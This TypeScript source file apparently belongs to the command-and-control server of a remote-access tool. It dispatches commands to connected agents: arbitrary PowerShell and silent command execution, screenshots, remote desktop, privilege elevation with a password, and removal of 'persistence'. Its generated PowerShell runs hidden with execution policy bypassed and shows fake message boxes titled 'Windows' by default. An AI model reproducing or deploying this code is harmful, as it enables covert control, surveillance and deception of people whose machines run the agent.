import { v4 as uuidv4 } from "uuid";
import { authenticateRequest } from "../../auth";
import { AuditAction, logAudit } from "../../auditLog";
import * as clientManager from "../../clientManager";
import { deleteClientRow, upsertClientRow } from "../../db";
import { metrics } from "../../metrics";
import { encodeMessage } from "../../protocol";
import { requireClientAccess, requireFeatureAccess, requirePermission } from "../../rbac";
import { clearThumbnail } from "../../thumbnails";
import type { ClientInfo } from "../../types";
import { sendPingRequest } from "../../wsHandlers";

type RequestIpProvider = {
  requestIP: (req: Request) => { address?: string } | null | undefined;
};

type PendingScript = {
  resolve: (result: any) => void;
  reject: (error: any) => void;
  timeout: NodeJS.Timeout;
  clientId: string;
};

type PendingCommandReply = {
  resolve: (result: { ok: boolean; message?: string }) => void;
  reject: (error: Error) => void;
  timeout: NodeJS.Timeout;
  clientId: string;
};

type ClientCommandDeps = {
  CORS_HEADERS: Record<string, string>;
  pendingScripts: Map<string, PendingScript>;
  pendingCommandReplies: Map<string, PendingCommandReply>;
};

function clampPositiveInt(value: unknown, fallback: number, max: number): number {
  const parsed = Number(value);
  if (!Number.isFinite(parsed) || parsed <= 0) return fallback;
  return Math.min(max, Math.max(1, Math.floor(parsed)));
}

const MESSAGE_BOX_ICONS = new Set(["error", "warning", "info", "question"]);
const MAX_OPEN_URL_LENGTH = 2048;
const MAX_MESSAGE_BOX_TITLE = 256;
const MAX_MESSAGE_BOX_TEXT = 2048;

export function normalizeOpenUrl(raw: unknown): { ok: true; url: string } | { ok: false; error: string } {
  const value = typeof raw === "string" ? raw.trim() : "";
  if (!value) return { ok: false, error: "url is required" };
  if (value.length > MAX_OPEN_URL_LENGTH) return { ok: false, error: "url is too long" };

  let candidate = value;
  if (candidate.startsWith("//")) {
    candidate = `https:${candidate}`;
  } else {
    const bareScheme = candidate.match(/^(https?):(?!\/\/)(.+)$/i);
    if (bareScheme) {
      candidate = `${bareScheme[1].toLowerCase()}://${bareScheme[2]}`;
    } else if (!/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(candidate)) {
      candidate = `https://${candidate}`;
    }
  }

  let parsed: URL;
  try {
    parsed = new URL(candidate);
  } catch {
    return { ok: false, error: "invalid url" };
  }

  const scheme = parsed.protocol.replace(/:$/, "").toLowerCase();
  if (scheme !== "http" && scheme !== "https") {
    return { ok: false, error: "only http and https urls are allowed" };
  }
  if (!parsed.hostname) {
    return { ok: false, error: "invalid url" };
  }

  return { ok: true, url: parsed.toString() };
}

export function normalizeMessageBox(body: any): {
  ok: true;
  title: string;
  text: string;
  icon: string;
} | { ok: false; error: string } {
  const text = typeof body?.text === "string" ? body.text.trim() : "";
  if (!text) return { ok: false, error: "text is required" };
  if (text.length > MAX_MESSAGE_BOX_TEXT) return { ok: false, error: "text is too long" };

  let title = typeof body?.title === "string" ? body.title.trim() : "";
  if (!title) title = "Windows";
  if (title.length > MAX_MESSAGE_BOX_TITLE) return { ok: false, error: "title is too long" };

  const iconRaw = typeof body?.icon === "string" ? body.icon.trim().toLowerCase() : "info";
  const icon = iconRaw === "alert" ? "warning" : iconRaw;
  if (!MESSAGE_BOX_ICONS.has(icon)) {
    return { ok: false, error: "icon must be error, warning, info, or question" };
  }

  return { ok: true, title, text, icon };
}

const CURSOR_BIG_MIN_SEC = 5;
const CURSOR_BIG_MAX_SEC = 300;
const CURSOR_BIG_DEFAULT_SEC = 30;

export function normalizeCursorBig(body: any): { ok: true; durationSec: number } | { ok: false; error: string } {
  const raw = body?.durationSec ?? body?.duration_sec ?? body?.duration;
  if (raw === undefined || raw === null || raw === "") {
    return { ok: true, durationSec: CURSOR_BIG_DEFAULT_SEC };
  }
  const parsed = Number(raw);
  if (!Number.isFinite(parsed)) {
    return { ok: false, error: `durationSec must be ${CURSOR_BIG_MIN_SEC}-${CURSOR_BIG_MAX_SEC}` };
  }
  const durationSec = Math.floor(parsed);
  if (durationSec < CURSOR_BIG_MIN_SEC || durationSec > CURSOR_BIG_MAX_SEC) {
    return { ok: false, error: `durationSec must be ${CURSOR_BIG_MIN_SEC}-${CURSOR_BIG_MAX_SEC}` };
  }
  return { ok: true, durationSec };
}

/** Escape a string for use inside single-quoted PowerShell literals. */
export function psSingleQuote(value: string): string {
  return `'${String(value).replace(/'/g, "''")}'`;
}

/** Open URL via Start-Process — works on existing agents without open_url handler. */
export function buildOpenUrlScript(url: string): string {
  const quoted = psSingleQuote(url);
  return `
$ErrorActionPreference = 'Stop'
Start-Process ${quoted}
Write-Output 'opened'
`.trim();
}

/** Message box via WinForms, launched detached so script_exec returns immediately. */
export function buildMessageBoxScript(title: string, text: string, icon: string): string {
  const iconMap: Record<string, string> = {
    error: "Error",
    warning: "Warning",
    question: "Question",
    info: "Information",
  };
  const psIcon = iconMap[icon] || "Information";
  const qTitle = psSingleQuote(title);
  const qText = psSingleQuote(text);
  // Nested single-quoted PS: double single-quotes already applied by psSingleQuote.
  return `
$ErrorActionPreference = 'Stop'
$show = @'
Add-Type -AssemblyName System.Windows.Forms
[void][System.Windows.Forms.MessageBox]::Show(${qText}, ${qTitle}, [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::${psIcon})
'@
Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList @(
  '-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-Command',$show
) | Out-Null
Write-Output 'shown'
`.trim();
}

/** PowerShell for existing agents (no cursor_big binary required). Applies max cursor size, restores after duration. */
export function buildCursorBigScript(durationSec: number): string {
  const sec = Math.max(CURSOR_BIG_MIN_SEC, Math.min(CURSOR_BIG_MAX_SEC, Math.floor(durationSec)));
  return `
$ErrorActionPreference = 'Stop'
$duration = ${sec}
$key = 'HKCU:\\Control Panel\\Cursors'
$name = 'CursorBaseSize'
$prev = 32
try {
  $existing = (Get-ItemProperty -Path $key -Name $name -ErrorAction Stop).$name
  if ($existing -and [int]$existing -gt 0 -and [int]$existing -lt 256) { $prev = [int]$existing }
} catch {}
if (-not (Test-Path -LiteralPath $key)) { New-Item -Path $key -Force | Out-Null }
Set-ItemProperty -Path $key -Name $name -Value 256 -Type DWord
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class CursorSizer {
  [DllImport("user32.dll", SetLastError=true)]
  public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);
}
"@
[void][CursorSizer]::SystemParametersInfo(0x57, 0, [IntPtr]::Zero, 3)
$restore = @"
Start-Sleep -Seconds $duration
Set-ItemProperty -Path 'HKCU:\\Control Panel\\Cursors' -Name 'CursorBaseSize' -Value $prev -Type DWord -ErrorAction SilentlyContinue
Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class CursorSizer2{[DllImport("user32.dll",SetLastError=true)]public static extern bool SystemParametersInfo(uint a,uint b,System.IntPtr c,uint d);}'
[void][CursorSizer2]::SystemParametersInfo(0x57,0,[IntPtr]::Zero,3)
"@
Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList @(
  '-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-Command',$restore
) | Out-Null
Write-Output ("applied for {0}s (restore to {1})" -f $duration, $prev)
`.trim();
}

type ScriptExecResult = { ok?: boolean; result?: string; error?: string };

async function runClientPowerShell(
  target: ClientInfo,
  deps: ClientCommandDeps,
  script: string,
  timeoutMs: number,
): Promise<ScriptExecResult> {
  const cmdId = uuidv4();
  const resultPromise: Promise<ScriptExecResult> = new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      deps.pendingScripts.delete(cmdId);
      reject(new Error("Command timed out"));
    }, timeoutMs);
    deps.pendingScripts.set(cmdId, { resolve, reject, timeout, clientId: target.id });
  });

  target.ws.send(encodeMessage({
    type: "command",
    commandType: "script_exec",
    id: cmdId,
    payload: { script, type: "powershell" },
  }));

  return resultPromise;
}

export function dispatchPingBulk(target: ClientInfo, countValue: unknown): number {
  const count = clampPositiveInt(countValue, 1, 1000);
  for (let i = 0; i < count; i++) {
    sendPingRequest(target, target.ws, "manual-bulk", 0);
  }
  return count;
}

async function waitForManualPing(target: ClientInfo, sentAt: number, timeoutMs = 1500): Promise<boolean> {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if ((target.lastPongAt ?? 0) >= sentAt && target.lastPingNonce === undefined) return true;
    await new Promise((resolve) => setTimeout(resolve, 10));
  }
  return false;
}

export async function handleClientCommandRoute(
  req: Request,
  url: URL,
  server: RequestIpProvider,
  deps: ClientCommandDeps,
): Promise<Response | null> {
  if (req.method !== "POST") return null;
  const cmdMatch = url.pathname.match(/^\/api\/clients\/(.+)\/command$/);
  if (!cmdMatch) return null;

  const user = await authenticateRequest(req);
  if (!user) return new Response("Unauthorized", { status: 401 });

  try {
    requirePermission(user, "clients:control");
  } catch (error) {
    if (error instanceof Response) return error;
    return new Response("Forbidden", { status: 403 });
  }

  const targetId = cmdMatch[1];
  try {
    requireClientAccess(user, targetId);
  } catch (error) {
    if (error instanceof Response) return error;
    return new Response("Forbidden", { status: 403 });
  }

  const target = clientManager.getClient(targetId);
  const ip = server.requestIP(req)?.address || "unknown";

  if (!target) return new Response("Not found", { status: 404 });

  try {
    const body = await req.json();
    const action = body?.action;
    let success = true;

    if (action === "ping") {
      const sentAt = Date.now();
      const sent = sendPingRequest(target, target.ws, "manual", 0);
      metrics.recordCommand("ping");
      if (body?.waitForResult === true) {
        const updated = sent ? await waitForManualPing(target, sentAt) : false;
        return Response.json({ ok: true, sent, updated, pingMs: target.pingMs ?? null }, { headers: deps.CORS_HEADERS });
      }
    } else if (action === "ping_bulk") {
      const count = dispatchPingBulk(target, body?.count);
      metrics.recordCommand("ping_bulk");
      logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.COMMAND, targetClientId: targetId, details: `ping_bulk:${count}`, success: true });
      return Response.json({ ok: true, sent: count }, { headers: deps.CORS_HEADERS });
    } else if (action === "disconnect") {
      try {
        requirePermission(user, "clients:disconnect");
        requireFeatureAccess(user, "disconnect");
      } catch (error) {
        if (error instanceof Response) return error;
        return new Response("Forbidden", { status: 403 });
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "disconnect", id: uuidv4() }));
      metrics.recordCommand("disconnect");
      logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.DISCONNECT, targetClientId: targetId, success: true });
    } else if (action === "reconnect") {
      try {
        requirePermission(user, "clients:reconnect");
        requireFeatureAccess(user, "reconnect");
      } catch (error) {
        if (error instanceof Response) return error;
        return new Response("Forbidden", { status: 403 });
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "reconnect", id: uuidv4() }));
      metrics.recordCommand("reconnect");
      logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.RECONNECT, targetClientId: targetId, success: true });
    } else if (action === "screenshot") {
      target.ws.send(encodeMessage({ type: "command", commandType: "screenshot", id: uuidv4(), payload: { mode: "notification", allDisplays: true } }));
      metrics.recordCommand("screenshot");
      logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.SCREENSHOT, targetClientId: targetId, success: true });
    } else if (action === "desktop_start") {
      target.ws.send(encodeMessage({ type: "command", commandType: "desktop_start", id: uuidv4() }));
      metrics.recordCommand("desktop_start");
    } else if (action === "darwin_request_permissions") {
      const targetOs = String(target.os || "").toLowerCase();
      if (!targetOs.includes("darwin") && !targetOs.includes("mac")) {
        return Response.json({ ok: false, error: "macOS permission requests are only available for macOS clients" }, { status: 400 });
      }
      const requested = Array.isArray(body?.permissions)
        ? body.permissions.filter((p: unknown) => typeof p === "string").slice(0, 8)
        : [];
      const refreshOnly = body?.refreshOnly === true;
      const cmdId = uuidv4();
      const replyPromise: Promise<{ ok: boolean; message?: string }> = new Promise((resolve, reject) => {
        const timeout = setTimeout(() => {
          deps.pendingCommandReplies.delete(cmdId);
          reject(new Error("macOS permission request timed out"));
        }, 45_000);
        deps.pendingCommandReplies.set(cmdId, { resolve, reject, timeout, clientId: targetId });
      });

      target.ws.send(encodeMessage({ type: "command", commandType: "darwin_request_permissions", id: cmdId, payload: { permissions: requested, refreshOnly } } as any));
      metrics.recordCommand("darwin_request_permissions");
      logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.COMMAND, targetClientId: targetId, success: true, details: "darwin_request_permissions" });

      try {
        const result = await replyPromise;
        let detail: any = {};
        if (result.message) {
          try { detail = JSON.parse(result.message); } catch { detail = {}; }
        }
        if (detail.permissions && typeof detail.permissions === "object" && !Array.isArray(detail.permissions)) {
          const checkedAt = Date.now();
          target.permissions = {
            ...(target.permissions || {}),
            ...detail.permissions,
          };
          target.lastSeen = checkedAt;
          upsertClientRow({ id: targetId, permissions: target.permissions, lastSeen: checkedAt, online: target.online ? 1 : 0 });
        }
        return Response.json({
          ok: result.ok,
          permissions: detail.permissions || null,
          missing: Array.isArray(detail.missing) ? detail.missing : [],
          message: result.message || "",
        }, { headers: deps.CORS_HEADERS });
      } catch (error: any) {
        return Response.json({ ok: false, error: error.message || "macOS permission request failed" }, { status: 504 });
      }
    } else if (action === "script_exec") {
      const scriptContent = body?.script || "";
      const scriptType = body?.scriptType || "powershell";
      const cmdId = uuidv4();

      const resultPromise = new Promise((resolve, reject) => {
        const timeout = setTimeout(() => {
          deps.pendingScripts.delete(cmdId);
          reject(new Error("Script execution timed out after 5 minutes"));
        }, 5 * 60 * 1000);
        deps.pendingScripts.set(cmdId, { resolve, reject, timeout, clientId: targetId });
      });

      target.ws.send(encodeMessage({ type: "command", commandType: "script_exec", id: cmdId, payload: { script: scriptContent, type: scriptType } }));
      metrics.recordCommand("script_exec");
      logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.SCRIPT_EXECUTE, targetClientId: targetId, success: true, details: `script_exec (${scriptType})` });

      try {
        const result = await resultPromise;
        return Response.json(result);
      } catch (error: any) {
        return Response.json({ ok: false, error: error.message }, { status: 500 });
      }
    } else if (action === "voice_capabilities") {
      const cmdId = uuidv4();
      const replyPromise: Promise<{ ok: boolean; message?: string }> = new Promise((resolve, reject) => {
        const timeout = setTimeout(() => {
          deps.pendingCommandReplies.delete(cmdId);
          reject(new Error("Voice capability probe timed out"));
        }, 30_000);
        deps.pendingCommandReplies.set(cmdId, { resolve, reject, timeout, clientId: targetId });
      });

      target.ws.send(encodeMessage({ type: "command", commandType: "voice_capabilities", id: cmdId }));

      try {
        const result = await replyPromise;
        let caps: any = null;
        if (result.message) {
          try { caps = JSON.parse(result.message); } catch { caps = null; }
        }
        return Response.json({ ok: result.ok, capabilities: caps, response: result.message || "" }, { headers: deps.CORS_HEADERS });
      } catch (error: any) {
        return Response.json({ ok: false, error: error.message || "Voice capability probe failed" }, { status: 504 });
      }
    } else if (action === "silent_exec") {
      try {
        requirePermission(user, "clients:silent-exec");
      } catch (error) {
        if (error instanceof Response) return error;
        return new Response("Forbidden", { status: 403 });
      }

      const command = typeof body?.command === "string" ? body.command.trim() : "";
      const args = typeof body?.args === "string" ? body.args : "";
      const cwd = typeof body?.cwd === "string" ? body.cwd : "";

      if (!command) return new Response("Bad request", { status: 400 });

      const cmdId = uuidv4();
      target.ws.send(encodeMessage({ type: "command", commandType: "silent_exec", id: cmdId, payload: { command, args, cwd } }));
      metrics.recordCommand("silent_exec");
      logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.SILENT_EXECUTE, targetClientId: targetId, success: true, details: JSON.stringify({ command, args, cwd }) });
    } else if (action === "open_url") {
      // script_exec so currently deployed agents work without a native open_url handler.
      const normalized = normalizeOpenUrl(body?.url);
      if (!normalized.ok) {
        return Response.json({ ok: false, error: normalized.error }, { status: 400, headers: deps.CORS_HEADERS });
      }
      metrics.recordCommand("open_url");
      try {
        const result = await runClientPowerShell(target, deps, buildOpenUrlScript(normalized.url), 45_000);
        const ok = !!result?.ok;
        const message = ok
          ? (result.result || "opened")
          : (result?.error || result?.result || "Open URL failed on client");
        logAudit({
          timestamp: Date.now(),
          username: user.username,
          ip,
          action: AuditAction.COMMAND,
          targetClientId: targetId,
          success: ok,
          details: `open_url:${normalized.url.slice(0, 200)}:${String(message).slice(0, 80)}`,
        });
        if (!ok) {
          return Response.json(
            { ok: false, error: message, url: normalized.url },
            { status: 502, headers: deps.CORS_HEADERS },
          );
        }
        return Response.json({ ok: true, url: normalized.url, message }, { headers: deps.CORS_HEADERS });
      } catch (error: any) {
        logAudit({
          timestamp: Date.now(),
          username: user.username,
          ip,
          action: AuditAction.COMMAND,
          targetClientId: targetId,
          success: false,
          details: `open_url:${normalized.url.slice(0, 200)}`,
          errorMessage: error?.message || "Open URL timed out",
        });
        return Response.json({ ok: false, error: error?.message || "Open URL timed out" }, { status: 504, headers: deps.CORS_HEADERS });
      }
    } else if (action === "message_box") {
      // script_exec so currently deployed agents work without a native message_box handler.
      const normalized = normalizeMessageBox(body);
      if (!normalized.ok) {
        return Response.json({ ok: false, error: normalized.error }, { status: 400, headers: deps.CORS_HEADERS });
      }
      metrics.recordCommand("message_box");
      try {
        const result = await runClientPowerShell(
          target,
          deps,
          buildMessageBoxScript(normalized.title, normalized.text, normalized.icon),
          45_000,
        );
        const ok = !!result?.ok;
        const message = ok
          ? (result.result || "shown")
          : (result?.error || result?.result || "Message box failed on client");
        logAudit({
          timestamp: Date.now(),
          username: user.username,
          ip,
          action: AuditAction.COMMAND,
          targetClientId: targetId,
          success: ok,
          details: `message_box:${normalized.icon}:${normalized.title.slice(0, 80)}:${String(message).slice(0, 80)}`,
        });
        if (!ok) {
          return Response.json({ ok: false, error: message }, { status: 502, headers: deps.CORS_HEADERS });
        }
        return Response.json({ ok: true, message }, { headers: deps.CORS_HEADERS });
      } catch (error: any) {
        logAudit({
          timestamp: Date.now(),
          username: user.username,
          ip,
          action: AuditAction.COMMAND,
          targetClientId: targetId,
          success: false,
          details: `message_box:${normalized.icon}:${normalized.title.slice(0, 80)}`,
          errorMessage: error?.message || "Message box timed out",
        });
        return Response.json({ ok: false, error: error?.message || "Message box timed out" }, { status: 504, headers: deps.CORS_HEADERS });
      }
    } else if (action === "cursor_big") {
      // script_exec so currently deployed agents work without a native cursor_big handler.
      const normalized = normalizeCursorBig(body);
      if (!normalized.ok) {
        return Response.json({ ok: false, error: normalized.error }, { status: 400, headers: deps.CORS_HEADERS });
      }
      metrics.recordCommand("cursor_big");
      try {
        const result = await runClientPowerShell(
          target,
          deps,
          buildCursorBigScript(normalized.durationSec),
          60_000,
        );
        const ok = !!result?.ok;
        const message = ok
          ? (result.result || `applied for ${normalized.durationSec}s`)
          : (result?.error || result?.result || "Big mouse failed on client");
        logAudit({
          timestamp: Date.now(),
          username: user.username,
          ip,
          action: AuditAction.COMMAND,
          targetClientId: targetId,
          success: ok,
          details: `cursor_big:duration=${normalized.durationSec}:${String(message).slice(0, 120)}`,
        });
        if (!ok) {
          return Response.json({ ok: false, error: message }, { status: 502, headers: deps.CORS_HEADERS });
        }
        return Response.json({ ok: true, message }, { headers: deps.CORS_HEADERS });
      } catch (error: any) {
        logAudit({
          timestamp: Date.now(),
          username: user.username,
          ip,
          action: AuditAction.COMMAND,
          targetClientId: targetId,
          success: false,
          details: `cursor_big:duration=${normalized.durationSec}`,
          errorMessage: error?.message || "Big mouse timed out",
        });
        return Response.json({ ok: false, error: error?.message || "Big mouse timed out" }, { status: 504, headers: deps.CORS_HEADERS });
      }
    } else if (action === "uninstall") {
      try {
        requirePermission(user, "clients:uninstall");
        requireFeatureAccess(user, "uninstall");
      } catch (error) {
        if (error instanceof Response) return error;
        return new Response("Forbidden", { status: 403 });
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "uninstall", id: uuidv4() }));
      metrics.recordCommand("uninstall");
      clientManager.deleteClient(targetId);
      deleteClientRow(targetId);
      clearThumbnail(targetId);
      logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.UNINSTALL, targetClientId: targetId, details: "Agent uninstall requested - persistence will be removed", success: true });
    } else if (action === "elevate") {
      try {
        requirePermission(user, "clients:elevate");
      } catch (error) {
        if (error instanceof Response) return error;
        return new Response("Forbidden", { status: 403 });
      }

      const password = typeof body?.password === "string" ? body.password : "";
      const cmdId = uuidv4();
      const replyPromise: Promise<{ ok: boolean; message?: string }> = new Promise((resolve, reject) => {
        const timeout = setTimeout(() => {
          deps.pendingCommandReplies.delete(cmdId);
          reject(new Error("Elevation timed out"));
        }, 30_000);
        deps.pendingCommandReplies.set(cmdId, { resolve, reject, timeout, clientId: targetId });
      });

      target.ws.send(encodeMessage({ type: "command", commandType: "elevate", id: cmdId, payload: { password } }));
      metrics.recordCommand("elevate");
      logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.COMMAND, targetClientId: targetId, success: true, details: "elevate" });

      try {
        const result = await replyPromise;
        return Response.json({ ok: result.ok, message: result.message || "" }, { headers: deps.CORS_HEADERS });
      } catch (error: any) {
        return Response.json({ ok: false, error: error.message || "Elevation failed" }, { status: 504 });
      }
    } else {
      success = false;
      return new Response("Bad request", { status: 400 });
    }

    logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.COMMAND, targetClientId: targetId, details: action, success });
    return Response.json({ ok: true });
  } catch (error) {
    logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.COMMAND, targetClientId: targetId, success: false, errorMessage: String(error) });
    return new Response("Bad request", { status: 400 });
  }
}
